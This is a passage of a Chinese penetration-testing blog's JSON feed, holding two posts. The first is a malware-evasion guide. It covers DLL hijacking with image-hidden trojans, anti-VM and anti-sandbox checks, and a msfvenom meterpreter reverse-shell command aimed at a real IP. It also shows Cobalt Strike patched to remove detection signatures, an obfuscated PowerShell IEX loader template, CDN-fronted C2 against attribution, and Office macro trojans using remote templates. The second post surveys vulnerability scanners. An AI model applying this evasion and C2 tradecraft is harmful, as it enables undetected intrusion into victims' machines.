Dependencies 工具将原有 dll 反编译为源码，分别为 c、asm、h 三个文 件。新建 dll 工程，设置 VS 的相关参数，并加载原有文件，使得可以正常导出 原有 dll。写 c/c++ 脚本写免杀木马的 dll，通过隐写在图片中的木马加载。当双 击 exe 程序时，dll 被调用，通过隐写在图片中的木马被加载至内存，对方主机 上线。</p>\n<p>工具推荐:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01yLVVuMWswZDNyL0RLTUM=\">https://github.com/Mr-Un1k0d3r/DKMC</span></p>\n<h4 id=\"sys回调与hook\"><a class=\"markdownIt-Anchor\" href=\"#sys回调与hook\">#</a> sys 回调与 hook</h4>\n<p>AV: 会检测软件有没有病毒</p>\n<p>EDR: 会检测软件的来源与功能，会对文件进行 hook，跟踪文件的走向</p>\n<p><strong>工具推荐:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzdCaXRzVGVhbS9FRFItQnlwYXNzLWRlbW8=\">https://github.com/7BitsTeam/EDR-Bypass-demo</span> 可以过卡巴斯基、eset、360、火绒、defender、McAee 等 AV/EDR 防病毒软件。</strong></p>\n<h3 id=\"其他免杀技术\"><a class=\"markdownIt-Anchor\" href=\"#其他免杀技术\">#</a> 其他免杀技术</h3>\n<h4 id=\"反调试与反虚拟化\"><a class=\"markdownIt-Anchor\" href=\"#反调试与反虚拟化\">#</a> 反调试与反虚拟化</h4>\n<p>近年来，各类恶意软件层出不穷，反病毒软件也更新了各种检测方案以提 高检测率。其中比较有效的方案是动态沙箱检测技术，即通过在沙箱中运行程 序并观察程序行为来判断程序是否为恶意程序。为了逃避沙箱 / 安全人员的检测， 恶意软件使用了各类识别沙箱 / 虚拟机的技术，用于判断自身程序是否运行在沙 箱 / 虚拟机中。</p>\n<ul>\n<li>反调试技术</li>\n</ul>\n<p>（ 1 ）调试器检测</p>\n<p>IsDebuggerPresent API ，PEB.BeingDebugged…<br>\nTLS 回调，hard/software breakpoints， VirtualAlloc</p>\n<p>（ 2 ）DLL 注入检测</p>\n<p>检测是否有 DLL 注入此进程来实现对进程的行为监控（HOOK）</p>\n<p>（ 3 ）Virtual Box 检测</p>\n<p>检测文件，例如 VBoxMouse.sys， VirtualBox Guest Additions directory…<br>\n 检测注册表，进程，服务，例如 VBoxControl.exe， VBoxService…<br>\n 检测硬件名称，MAC 地址等等…</p>\n<p>（ 4 ）VMware 检测</p>\n<p>与 VB 检测类似</p>\n<p>（ 5 ）其他虚拟平台检测</p>\n<p>如 Xen, QEMU, Wine, Paralles…</p>\n<p>（ 6 ）分析工具进程检测</p>\n<p>检测如 OD, ProcessMonitor, Autorun 等分析工具进程的存在…</p>\n<p>（ 7 ）通用沙盒 / 虚拟机检测</p>\n<p>检测是否存在特殊进程名，模块名<br>\n通过 WMI 检测真实硬件状态，例如硬盘大小，内存大小，CPU 风扇，型<br>\n号，BIOS 序列号名称，电源电压，温度等等…</p>\n<ul>\n<li>沙盒平台</li>\n</ul>\n<p>微步沙盒：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zLnRocmVhdGJvb2suY24v\">https://s.threatbook.cn/</span><br>\n 腾讯哈勃分析系统：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWJvLnFxLmNvbS8=\">https://habo.qq.com/</span><br>\n 魔盾：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWFsZHVuLmNvbS9hbmFseXNpcy8=\">https://www.maldun.com/analysis/</span><br>\n 微点沙盒：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYW5kYm94LmRlcHRoc2VjLmNvbS5jbi9pbmRleC5waHAv\">https://sandbox.depthsec.com.cn/index.php/</span><br>\n 奇安信文件深度分析平台：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYW5kYm94LnRpLnFpYW54aW4uY29tL3NhbmRib3gvcGFnZQ==\">https://sandbox.ti.qianxin.com/sandbox/page</span><br>\nANYRUN：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcHAuYW55LnJ1bi8=\">https://app.any.run/</span><br>\nHybridAnalysis (Falcon Sandbox)：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaHlicmlkLWFuYWx5c2lzLmNvbS8=\">https://www.hybrid-analysis.com/</span><br>\nCAPE Sandbox: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jYXBlc2FuZGJveC5jb20v\">https://capesandbox.com/</span><br>\nBD Sandbox Analyzer：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYml0ZGVmZW5kZXIuY29tL2J1c2luZXNzL2VudGVycHJpc2UtcHJvZHVjdHMvc2FuZGJveC1hbmFseXplci5odG1s\">https://www.bitdefender.com/business/enterprise-products/sandbox-analyzer.html</span><br>\nJoe Sanbox: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuam9lc2FuZGJveC5jb20v\">https://www.joesandbox.com/</span></p>\n<ul>\n<li>规避 VT 检测</li>\n</ul>\n<p>（ 1 ）虚拟机检测 禁止虚拟机运行</p>\n<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 LPORT=6688 -f hex</code> <br>\npython 查看 cpu、memory 的核数实现，通过命令行判断当前是否是虚拟机，通过有虚拟机才有的特殊文件判断是否是虚拟机等多种方法结合起来，综合判断当前是否在虚拟机内，如果是，则不允许执行 shellcode，否则释放代码，执行上线。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8yNDgxNzUuaHRt\">https://www.jb51.net/article/248175.htm</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvc3lzdGVtLzIwMjcxNy5odG1s\">https://www.freebuf.com/articles/system/202717.html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xjMTk5MjA3MjcvYXJ0aWNsZS9kZXRhaWxzLzEyMjgyMDIwOQ==\">https://blog.csdn.net/lc19920727/article/details/122820209</span></p>\n<p>也可以通过 c++ 语言进行综合判断当前是否在虚拟机，如果是再执行 shellcode<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoYXJlcHViL0NoZWNrVk0tU2FuZGJveA==\">https://github.com/sharepub/CheckVM-Sandbox</span></p>\n<p>（ 2 ）调试检测 禁止 od 调试</p>\n<p>如果我们在对抗的过程中被蓝队人员拿到了样本，他想用 od 去调一下这个程序怎么走的，肯定也不会拿到本机里面调，如果这个 exe 有毒，那电脑就全完了，所以最好的选择还是虚拟机环境，首先反调试的第一个目标就是反虚拟机调试。</p>\n<p>查阅资料后发现如果使用虚拟机，一般的路径都为 (在没有修改过的情况下) C:\\Program Files\\VMware<br>\n 查看几个虚拟机后发现 vm 的默认进程有 vmtoolsd.exe 和 vmacthlp.exe，直接判断进程是否存在即可起到反调试的效果</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzc1OA==\">https://forum.butian.net/share/758</span></p>\n<p>（ 3 ）反沙箱调试 禁止沙箱运行</p>\n<p>最简单的反调试的措施就是检测父进程。一般来说，我们手动点击执行的程序的父进程都是 explorer。如果一个程序的父进程不是 explorer，那么我们就可以认为他是由沙箱启动的。那么我们就直接 exit 退出，这样杀软就无法继续对我们进行行为分析了。</p>\n<p>绕过：伪造父进程为 explorer.exe 呢，那么上面这种反调试的方法就行不通了。采用这种方法之后，木马仍然可以再沙箱中调试。</p>\n<p>反调试及绕过：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvbUMwWGhOU3dkaGhJU3djQkZYZTB1UQ==\">https://mp.weixin.qq.com/s/mC0XhNSwdhhISwcBFXe0uQ</span></p>\n<p>（ 4 ）程序保护 禁止虚拟机 od 调试</p>\n<p>项目推荐：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0xvcmROb3Rld29ydGh5L2FsLWtoYXNlcg==\">https://github.com/LordNoteworthy/al-khaser</span><br>\n 参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FmYW4uY24vdGhyZWFkLTIxODE4NjktMS0xLmh0bWw=\">https://bbs.kafan.cn/thread-2181869-1-1.html</span></p>\n<p>al-khaser 是一个具有良好意图的 PoC “恶意软件” 应用程序，旨在强调您的反恶意软件系统。它执行一系列常见的恶意软件技巧，目的是查看您是否躲在雷达之下。</p>\n<h4 id=\"二次开发cs\"><a class=\"markdownIt-Anchor\" href=\"#二次开发cs\">#</a> 二次开发 CS</h4>\n<ul>\n<li>反编译 cs 的 jar 文件</li>\n</ul>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3plcjB5dS9Bd2Vzb21lLUNvYmFsdFN0cmlrZQ==\">https://github.com/zer0yu/Awesome-CobaltStrike</span><br>\n 反编译 Jar 包、新建 Java（ 11 ）项目、修改上线代码、打包替换编译、替换服务客户端</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">反编译：</span></span><br><span class=\"line\">java -cp IDEA_HOME/plugins/java-decompiler/lib/java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true &lt;src.jar&gt; &lt;dest dir&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">具体命令：</span></span><br><span class=\"line\">&quot;D:\\program files\\Java\\jdk11\\bin\\java.exe&quot; -cp &quot;C:\\Program Files\\JetBrains\\IntelliJ IDEA 2022.1.3\\plugins\\java-decompiler\\lib\\java-decompiler.jar&quot; org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cobaltstrike.jar coba</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">会在coba下生成.jar文件，此时在智能解压会反编译为.java后缀的源码</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>对端口密码证书做特征消除</li>\n</ul>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3plcjB5dS9Bd2Vzb21lLUNvYmFsdFN0cmlrZQ==\">https://github.com/zer0yu/Awesome-CobaltStrike</span></p>\n<p>cobaltstrike.beacon_keys 和 cobaltstrike.store 不要使用默认的文件，删除</p>\n<p>profile 文件要换新的，启动服务端时记得加载，或直接把 jar 包里面的默认配置给改了</p>\n<p>开在公网的 teamserver 不要使用默认端口</p>\n<ul>\n<li>对 http/s 上线流量做特征消除</li>\n</ul>\n<p>checksum8 函数对比后续 - common\\CommonUtils&amp;cloudstrike\\WebServer</p>\n<p>观察 cs 上线时的日志，会在木马运行时访问一个 4 位英文字符组成的文件， 逆向分析源码之后发现这四个字符经过某种算法计算之后显示为 92/93，可以以 此为基础，对源码进行修改，改变 http/https 流量的特征码，修改原流量特征。</p>\n<p>将修改好的文件编译为 class 文件，以解压缩的方式覆盖在 jar 包中，替换 原有的 class 文件，以此来使自己修改的部分生效。</p>\n<ul>\n<li>对 Powershell 生成 Payload 做特征消除</li>\n</ul>\n<p>功能生成 - 搜代码块 -&gt; 找引用 (template.x86.ps1)-&gt;BaseResourceUtils-&gt;_buildPowerShellNoHint</p>\n<p>用自己已经免杀过的 powershell 脚本来替换原有的未免杀脚本，将文件替换为原有的模板文件，编译为 class，以压缩包的方式进行替换，由此生成的 powershell payload 是免杀的。</p>\n<p>也可以修改 artifact.exe 的特征码达到生成的 exe 文件就是免杀的，但是比较难哦。</p>\n<ul>\n<li>powershell 免杀模版文件：</li>\n</ul>\n<p>找源码中生成 powershell 木马的源文件及逻辑，修改模板文件，将模板文件改为如下内容，同时编译修改的文件为 class 文件，替换原有 class 文件中的<br>\n文件，实现生成的文件即免杀。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-StrictMode -Version 2</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">x1=<span class=\"string\">&#x27;&#x27;</span>;<span class=\"variable\">$x2</span>=<span class=\"string\">&#x27;%%DATA%%&#x27;</span>;<span class=\"variable\">$x3</span>=<span class=\"string\">&#x27;&#x27;</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">xx1=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class=\"variable\">$x1</span>))</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">xx2=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class=\"variable\">$x2</span>))</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">xx3=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(<span class=\"variable\">$x3</span>))</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">xxx=<span class=\"variable\">$xx1</span>+<span class=\"variable\">$xx2</span>+<span class=\"variable\">$xx3</span></span></span><br><span class=\"line\">If ([IntPtr]::size -eq 8) &#123;</span><br><span class=\"line\">  start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $xxx | wait-job | Receive-Job</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else &#123;</span><br><span class=\"line\">  IEX $xxx</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>改变生成 C shellcode 的逻辑 直接 base 64 编码</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static byte[] toC(byte[] var0) &#123;</span><br><span class=\"line\">  Packer var1 = new Packer();</span><br><span class=\"line\">  var1.addString(&quot;/* length: &quot; + var0.length + &quot; bytes */\\n&quot;);</span><br><span class=\"line\">  var1.addString(&quot;unsigned char buf[] = \\&quot;&quot; + CommonUtils.bString(toVeil(var0)) + &quot;\\&quot;;\\n&quot;);</span><br><span class=\"line\">  return var1.getBytes();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"防朔源\"><a class=\"markdownIt-Anchor\" href=\"#防朔源\">#</a> 防朔源</h4>\n<ul>\n<li>CDN 节点防拉黑 ip</li>\n</ul>\n<p>域名注册商：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZy5nb2RhZGR5LmNvbS8=\">https://sg.godaddy.com/</span><br>\ncdn 解析商：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kYXNoLmNsb3VkZmxhcmUuY29tLw==\">https://dash.cloudflare.com/</span><br>\nc2 模板：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RocmVhdGV4cHJlc3MvbWFsbGVhYmxlLWMy\">https://github.com/threatexpress/malleable-c2</span></p>\n<p>（ 1 ）前期准备</p>\n<p>申请 godaddy 域名、配置 cloudflare、添加解析记录，指向 CS 的 IP、配置 DNS 服务器，使用 cloudflare、下载 C2 文件模版，修改配置并上传、启动 CS 加载 CS 模版，使用 stag 生成</p>\n<p>（ 2 ）因为 cloudflare 的原因这里端口的设置需要注意以下：</p>\n<p>若是 http，则只能设置 80,8080,8880,2052,2082,2086,2095 这些端口号<br>\n若是 https，则只能设置 443,2053,2083,2087,2096,8443 这些端口号</p>\n<p>（ 3 ）cs 后门生成使用 Stageless 模式</p>\n<p>依次生成后门，如果对方进行朔源，拉黑的 ip 将会是域名解析的 cdn ip</p>\n<ul>\n<li>修改 cs 的 SSL 证书</li>\n</ul>\n<p>（ 1 ）配置 SSL 设置</p>\n<p>创建证书（SSL - 源服务器）、设置页面规则 (缓存级别 - 绕过)、保存 CSR &amp; 密匙 (server.pem&amp;server.key)</p>\n<p>（ 2 ）生成证书文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl pkcs12 -export -in server.pem -inkey server.key -out [http://www.yaosese.](http://www.yaosese.) xyz.p12 -name [http://www.yaosese.xyz](http://www.yaosese.xyz) -passout pass:123456</span><br><span class=\"line\">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkey store [http://www.yaosese.xyz.store](http://www.yaosese.xyz.store) -srckeystore [http://www.yaosese.xyz.p12](http://www.yaosese.xyz.p12) -srcstoretype PK CS12 -srcstorepass 123456 -alias [http://www.yaosese.xyz](http://www.yaosese.xyz)</span><br></pre></td></tr></table></figure>\n<p>（ 3 ）修改 teamserver</p>\n<p>证书指向：www.yaosese.xyz.store<br>\n 证书密码： 123456</p>\n<p>（ 4 ）启动 teamserver</p>\n<p>./teamserver ip pass jquery-c2.4.5.profile</p>\n<ul>\n<li>OSS 存储 shellcode</li>\n</ul>\n<p>将 shellcode 编码后存储在 oss 上，是安全的标志，可以进行免杀的无文件落地。云上开启 OSS 对象存储、创建 Bucket 列表、设置 Bucket 属性、上传 Shellcode 文件、获取地址 &amp; 代码加载</p>\n<h4 id=\"office套件宏病毒\"><a class=\"markdownIt-Anchor\" href=\"#office套件宏病毒\">#</a> office 套件宏病毒</h4>\n<ul>\n<li>本地宏引用</li>\n</ul>\n<p>通过 cs 生成宏代码，打开 office 的选项，增加开发工具，新增宏为上线代码。存储为 97 - 23.doc 或者 docm、并且在首次打开 word 时启用宏可以上线。但是此宏会被杀毒软件自动清除，所以需要进行免杀，否则无法上线。</p>\n<ul>\n<li>本地宏引用 工具混淆</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">https://github.com/outflanknl/EvilClippy</span></span><br><span class=\"line\">EvilClippy -s 1.vba xd.doc</span><br><span class=\"line\">Sub Hello()</span><br><span class=\"line\">Dim X</span><br><span class=\"line\">X=MsgBox(&quot;Hello VBS&quot;)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>本地宏引用 混淆 VBA</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">VBA代码助手 macro_pack</span></span><br><span class=\"line\">BadAssMacrosx-i payload.bin -w doc -p no -s classic -c 5 -o 1.vba</span><br><span class=\"line\">https://github.com/lgzcarson/Payloads/blob/3066615cde55f9cd6755ed81a7d83c229f78e397/Methodology%20and%20Resources/Office%20-%20Attacks.md</span><br></pre></td></tr></table></figure>\n<ul>\n<li>远程宏引用</li>\n</ul>\n<p>将 docm 宏存储在远程 oss 或者 github 上，用带模板的 docx 通过修改 settings.xml 来指向远程宏木马所在的位置。<br>\n（ 1 ）制作包含宏的恶意模版文件（.docm），注意用 EvilClippy 做一层免杀。<br>\n（ 2 ）将恶意模版文件上传至服务器。如 Github、OSS 等公共文件平台。<br>\n（ 3 ）新建并保存一个使用任意模版的 docx 文件。改 docx 后缀为 zip，解压 docx 文件，修改 word_rels\\settings.xml.rels 文件的 Target 属性，将其指向部署恶意模版文件的服务器。<br>\n（ 4 ）使用 zip 格式压缩文件，并重新命名后缀为 docx。<br>\n（ 5 ）重新打开 docx 文件，并启用宏。</p>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/",
            "title": "XD22 6 漏洞发现及利用",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"服务漏洞探测\"><a class=\"markdownIt-Anchor\" href=\"#服务漏洞探测\">#</a> 服务漏洞探测</h3>\n<p>服务漏洞发现指的是发现搭建在操作系统上的服务漏洞。</p>\n<h4 id=\"相关工具介绍\"><a class=\"markdownIt-Anchor\" href=\"#相关工具介绍\">#</a> 相关工具介绍</h4>\n<ul>\n<li>相关工具说明</li>\n</ul>\n<p>Acunetix 一款商业的 Web 漏洞扫描程序，它可以检查 Web 应用程序中的漏 洞，如 SQL 注入、跨站脚本攻击、身份验证页上的弱口令长度等。它拥有一个 操作方便的图形用户界面，并且能够创建专业级的 Web 站点安全审核报告。新 版本集成了漏洞管理功能来扩展企业全面管理、优先级和控制漏洞威胁的能力。</p>\n<p>Burp Suite 是用于攻击 web 应用程序的集成平台，包含了许多工具。Burp Suite 为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共 享一个请求，并能处理对应的 HTTP 消息、持久性、认证、代理、日志、警报。</p>\n<p>pocassist 是一个 Golang 编写的全新开源漏洞测试框架。实现对 poc 的在线 编辑、管理、测试。如果你不想撸代码，又想实现 poc 的逻辑，又想在线对靶 机快速测试，那就使用 pocassist 吧。完全兼容 xray，但又不仅仅是 xray。除了 支持定义目录级漏洞 poc，还支持服务器级漏洞、参数级漏洞、url 级漏洞以及 对页面内容检测，如果以上还不满足你的需求，还支持加载自定义脚本。</p>\n<p>afrog 是一款性能卓越、快速稳定、PoC 可定制的漏洞扫描 (挖洞) 工具， PoC 涉及 CVE、CNVD、默认口令、信息泄露、指纹识别、未授权访问、任意 文件读取、命令执行等多种漏洞类型，帮助网络安全从业者快速验证并及时修 复漏洞。</p>\n<p>Xray 是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、 被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单， 支持 Windows /macOS/Linux 多种操作系统，可以满足广大安全从业者的自动 化 Web 漏洞探测需求。</p>\n<p>Goby 是一款新的网络安全测试工具，由赵武 Zwell (Pangolin、JSky、 FOFA 作者) 打造，它能够针对一个目标企业梳理最全的攻击面信息，同时能进 行高效、实战化漏洞扫描，并快速的从一个验证入口点，切换到横向。能通过 智能自动化方式，帮助安全入门者熟悉靶场攻防，帮助攻防服务者、渗透人员 更快的拿下目标。</p>\n<p>Vulmap 是一款 web 漏洞扫描和验证工具，可对 webapps 进行漏洞扫描，并且具备漏洞利用功能，目前支持的 webapps 包括 activemq, flink, shiro, solr, struts2, tomcat, unomi, drupal, elasticsearch, fastjson, jenkins, nexus, weblogic, jboss, spring, thinkphp。</p>\n<ul>\n<li>项目资源</li>\n</ul>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGRvc2kub3JnL2F3dnMxNC02LWxvZzRqLXJjZS8=\">https://www.ddosi.org/awvs14-6-log4j-rce/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NoYWl0aW4veHJheS9yZWxlYXNlcw==\">https://github.com/chaitin/xray/releases</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3phbjhpbi9hZnJvZy9yZWxlYXNlcw==\">https://github.com/zan8in/afrog/releases</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3poenlrZXIvdnVsbWFwL3JlbGVhc2Vz\">https://github.com/zhzyker/vulmap/releases</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L3BvY2Fzc2lzdC9yZWxlYXNlcw==\">https://github.com/jweny/pocassist/releases</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvYnlzZWMvR29ieS9yZWxlYXNlcw==\">https://github.com/gobysec/Goby/releases</span></p>\n<h4 id=\"awvs-burp-xray\"><a class=\"markdownIt-Anchor\" href=\"#awvs-burp-xray\">#</a> awvs burp xray</h4>\n<ul>\n<li>Awvs：任务添加 &amp; 数据头部 &amp; 代理模式 &amp; 扫描模式等</li>\n</ul>\n<p>example：<span class=\"exturl\" data-url=\"aHR0cDovL2RlbW8uYWlzZWMuY24v\">http://demo.aisec.cn/</span></p>\n<p>去扫一些小众的 cms 是可以扫到的，但是如果扫有很多用户的 cms 或框架的话一般很难扫到，因为这些玩意的作者也会去这样做安全测试然后堵上漏洞，或者说没有集成到 awvs 的漏洞库中。</p>\n<ul>\n<li>Xray：主动扫描 &amp; 被动扫描 &amp; POC 资源等</li>\n</ul>\n<p>.\\xray_windows_amd64.exe webscan --basic-crawler <span class=\"exturl\" data-url=\"aHR0cDovL3h4Lw==\">http://xx/</span> --html-output tomcat.html</p>\n<p>社区版的漏洞库不太好，但还可以用用。</p>\n<ul>\n<li>burp+xray 联动：</li>\n</ul>\n<p>burp 监听某端口，将 web 或者 app 的流量代理到 burp，设置 burp 的上游代理为 7777 ，同时将 xray 设置监听 7777 ，等待 xray 扫描完成查看检测结果<br>\n <code>.\\xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output app.html</code></p>\n<ul>\n<li>AWVS+xray+burp</li>\n</ul>\n<p>设置 awvs 的代理至 7777 ，由 xray 监听，这样做可以发挥两者的优点，既有 awvs 自定义的数据包，又能借用 xray 去扫这些数据；同时也可以配置中间代理 burp，再 burp 查看到 awvs 扫描到的所有数据。</p>\n<h4 id=\"pocasit-afrog-vulmap\"><a class=\"markdownIt-Anchor\" href=\"#pocasit-afrog-vulmap\">#</a> pocasit afrog vulmap</h4>\n<ul>\n<li>afrog 可以扫描出漏洞编号，但是需要自己去利用</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">扫描一个目标</span> </span><br><span class=\"line\">afrog -t http://127.0.0.1</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">扫描多个目标</span> </span><br><span class=\"line\">afrog -T urls.txt</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">指定漏扫报告文件</span></span><br><span class=\"line\">afrog -t http://127.0.0.1 -o result.html</span><br></pre></td></tr></table></figure>\n<ul>\n<li>Vulmap 是一款 web 漏洞扫描和验证工具，可对 webapps 进行漏洞扫描，</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 vulmap.py -u http://example.com</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">pocassist全新的漏洞测试框架，支持poc在线编辑、运行、批量测试。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">直接运行打卡网页版即可以测试，但是漏洞库再 2 1.7后不再更新</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>goby 可以通过插件的方式联动 vulmap、awvs、xray 需要自己配置</li>\n</ul>\n<p>也可以直接去扫描漏洞，扫描之后可以查看到相关的漏洞信息报告，也可以跟 fofa 配合批量测试<br>\n这些漏洞发现基本上都是只负责发现漏洞是存在的，但是不会去利用漏洞，漏洞利用需要自己去测或者用其他的工具</p>\n<h3 id=\"操作系统服务探测\"><a class=\"markdownIt-Anchor\" href=\"#操作系统服务探测\">#</a> 操作系统服务探测</h3>\n<h4 id=\"系统漏洞探测工具\"><a class=\"markdownIt-Anchor\" href=\"#系统漏洞探测工具\">#</a> 系统漏洞探测工具</h4>\n<ul>\n<li>相关工具介绍</li>\n</ul>\n<p>Nuclei 是一款基于 YAML 语法模板的开发的定制化快速漏洞扫描器。它使 用 Go 语言开发，具有很强的可配置性、可扩展性和易用性。 提供 TCP、DNS、 HTTP、FILE 等各类协议的扫描，通过强大且灵活的模板，可以使用 Nuclei 模拟各种安全检查。</p>\n<p>Nessus 号称是世界上最流行的漏洞扫描程序，全世界有超过 75000 个组织 在使用它。该工具提供完整的电脑漏洞扫描服务，并随时更新其漏洞数据库。 Nessus 不同于传统的漏洞扫描软件，Nessus 可同时在本机或远端上遥控，进行 系统的漏洞分析扫描。</p>\n<p>Nexpose 是 Rapid7 出品，一款著名的、极佳的商业漏洞扫描工具。跟一 般的扫描工具不同，Nexpose 